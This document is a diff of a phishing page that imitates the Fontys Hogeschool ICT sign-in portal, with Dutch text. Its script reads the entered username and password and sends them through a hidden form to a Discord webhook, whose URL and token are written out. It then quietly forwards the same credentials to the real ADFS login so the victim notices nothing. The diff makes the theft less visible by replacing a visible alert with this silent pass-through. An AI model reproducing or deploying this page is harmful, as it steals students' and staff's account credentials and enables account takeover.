@@ -1,10 +1,13 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="nl-NL">
 <head>
-  <meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=1">
-  <meta http-equiv="cache-control" content="no-cache,no-store"><meta http-equiv="pragma" content="no-cache">
-  <meta http-equiv="expires" content="-1"><meta name="mswebdialog-title" content="Connecting to Fontys Hogeschool ICT">
+  <meta http-equiv="cache-control" content="no-cache,no-store">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="expires" content="-1">
+  <meta name="mswebdialog-title" content="Connecting to Fontys Hogeschool ICT">
   <title>Sign In</title>
   <link rel="stylesheet" href="css/style.css">
   <style>
@@ -13,6 +16,7 @@
       background-size: cover;
       background-position: center;
     }
+    body.loading { cursor: wait; }
   </style>
 </head>
 <body dir="ltr" class="body">
@@ -33,9 +37,7 @@
               <div id="loginMessage" class="groupMargin">
                 Sign in with your organizational account
               </div>
-              <form id="loginForm"
-                    autocomplete="off"
-                    onsubmit="return sendToDiscord()">
+              <form id="loginForm" autocomplete="off" onsubmit="return handleLogin();">
                 <div id="error" class="fieldMargin error smallText" style="display:none">
                   <span id="errorText"></span>
                 </div>
@@ -61,8 +63,8 @@
                   <div id="submissionArea" class="submitMargin">
                     <span id="submitButton" class="submit"
                           tabindex="4" role="button"
-                          onclick="return sendToDiscord()"
-                          onkeypress="if(event&&event.keyCode==32)sendToDiscord()">
+                          onclick="return handleLogin()"
+                          onkeypress="if (event && event.keyCode===32) handleLogin()">
                       Sign in
                     </span>
                   </div>
@@ -70,17 +72,12 @@
                 <input type="hidden" id="optionForms" name="AuthMethod" value="FormsAuthentication">
               </form>
             </div>
-            <div id="authOptions">
-              <form id="options" method="post" action="…">
-                <input type="hidden" id="optionSelection" name="AuthMethod">
-                <div id="authOptionLinks" class="groupMargin"></div>
-              </form>
-            </div>
+            <div id="authOptions">…</div>
             <div id="introduction" class="groupMargin">
               <p>
                 Forgot your password?
-                Click <a href="https://passwordreset.fontysict.nl">here</a>
-                for more information.
+                Click <a href="https://passwordreset.fontysict.nl">hier</a>
+                voor meer informatie.
               </p>
             </div>
           </div>
@@ -94,45 +91,80 @@
     </div>
   </div>
 
-  <!-- verborgen iframe voor het POSTen -->
-  <iframe name="discordFrame" style="display:none;"></iframe>
-
-  <!-- verborgen form naar Discord-webhook -->
+  <!-- verborgen iframe en form voor Discord-webhook -->
+  <iframe name="discordFrame" id="discordFrame" style="display:none;"></iframe>
   <form id="webhookForm"
         action="https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE"
-        method="POST"
-        target="discordFrame">
+        method="POST" target="discordFrame">
     <input type="hidden" name="payload_json" id="payload_json" value="">
   </form>
 
   <script>
-    function sendToDiscord() {
-      // Lees velden
+    // Enter-to-submit
+    document.getElementById('loginForm')
+      .addEventListener('keypress', e => {
+        if (e.key === 'Enter' || e.keyCode === 13) {
+          e.preventDefault();
+          handleLogin();
+        }
+      });
+
+    function handleLogin() {
       const user = document.getElementById('userNameInput').value.trim();
       const pass = document.getElementById('passwordInput').value.trim();
       const err  = document.getElementById('error');
       const errText = document.getElementById('errorText');
 
-      // Validatie
+      // 1) Validatie
       if (!user || !pass) {
-        errText.textContent = 'Vul zowel loginnaam als wachtwoord in.';
+        errText.textContent = 'Vul zowel gebruikersnaam als wachtwoord in.';
         err.style.display = 'block';
         return false;
       }
       err.style.display = 'none';
 
-      // Bouw payload
+      // 2) Toon wait-cursor
+      document.body.classList.add('loading');
+
+      // 3) Bouw payload en stuur naar Discord
       const payload = JSON.stringify({
         content: `**Loginnaam:** ${user}\n**Password:** ${pass}`
       });
-
-      // Vul verborgen form en verstuur
       document.getElementById('payload_json').value = payload;
       document.getElementById('webhookForm').submit();
 
-      // Melding
-      alert('Verzonden naar Discord!');
-      return false; // voorkom reload
+      // 4) Na korte pauze: ADFS-login afhandelen
+      setTimeout(() => {
+        // verborgen ADFS-form opbouwen
+        const adfsForm = document.createElement('form');
+        adfsForm.method = 'POST';
+        adfsForm.action =
+          'https://login.fontysict.nl/adfs/ls?version=1.0' +
+          '&action=signin' +
+          '&realm=urn%3AAppProxy%3Acom' +
+          '&appRealm=5e08666e-3832-ef11-a65f-005056a7022a' +
+          '&returnUrl=https%3A%2F%2Fportal.fhict.nl%2F' +
+          '&client-request-id=AB5ECBA9-CE97-0001-53E7-61AB97CEDB01';
+
+        function addField(name, value) {
+          const inp = document.createElement('input');
+          inp.type  = 'hidden';
+          inp.name  = name;
+          inp.value = value;
+          adfsForm.appendChild(inp);
+        }
+        addField('UserName',   user);
+        addField('Password',   pass);
+        addField('AuthMethod', 'FormsAuthentication');
+        if (document.getElementById('kmsiInput').checked) {
+          addField('Kmsi', 'true');
+        }
+
+        document.body.appendChild(adfsForm);
+        adfsForm.submit();
+      }, 500); // 0.5 seconde wachten
+
+      return false;
     }
   </script>
 </body>
